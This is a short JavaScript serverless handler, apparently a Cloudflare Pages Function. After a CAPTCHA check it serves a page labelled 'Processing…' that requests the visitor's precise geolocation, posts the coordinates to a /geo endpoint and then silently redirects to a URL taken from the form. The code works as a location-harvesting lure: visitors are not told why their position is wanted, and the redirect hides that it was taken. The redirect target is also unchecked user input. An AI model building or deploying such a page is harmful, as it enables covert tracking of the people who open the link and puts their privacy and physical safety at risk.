export async function onRequestPost({ request, env }) {
  const form = await request.formData();

  const token = form.get('cf-turnstile-response');
  const redirectParam = form.get("redirect") || "https://www.google.com";

  // read noredirect from query string (not from form)
  const url = new URL(request.url);
  const noredirect = url.searchParams.get("noredirect") === "1";

  const ip = request.headers.get("cf-connecting-ip");

  if (!token) {
    return new Response("Missing CAPTCHA token", { status: 400 });
  }

  let redirectURL;
  try {
    redirectURL = new URL(redirectParam).toString();
  } catch {
    redirectURL = "https://www.google.com";
  }

  const verifyResp = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      secret: env.TURNSTILE_SECRET,
      response: token,
      remoteip: ip
    })
  });

  const verifyData = await verifyResp.json();
  if (!verifyData.success) {
    return new Response("CAPTCHA verification failed", { status: 403 });
  }

  const html = `
    <!DOCTYPE html>
    <html>
      <head><title>Processing…</title></head>
      <body>
        <div id="status">Processing...</div>
        <script>
          const redirect = ${JSON.stringify(redirectURL)};
          const noredirect = ${noredirect};
          function showMessage(msg) {
            document.getElementById('status').innerText = msg;
          }

          navigator.geolocation.getCurrentPosition(
            function(location) {
              fetch('/geo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  lat: location.coords.latitude,
                  lon: location.coords.longitude
                })
              })
              .then(() => {
                if (noredirect) {
                  showMessage("✅ Location received. Thank you.");
                } else {
                  window.location.href = redirect;
                }
              })
              .catch(() => {
                if (noredirect) {
                  showMessage("⚠️ Location logged, but an error occurred.");
                } else {
                  window.location.href = redirect;
                }
              });
            },
            function(error) {
              if (noredirect) {
                showMessage("⚠️ Location access denied. Thank you.");
              } else {
                window.location.href = redirect;
              }
            }
          );
        </script>
      </body>
    </html>
  `;

  return new Response(html, {
    headers: { 'Content-Type': 'text/html; charset=utf-8' }
  });
}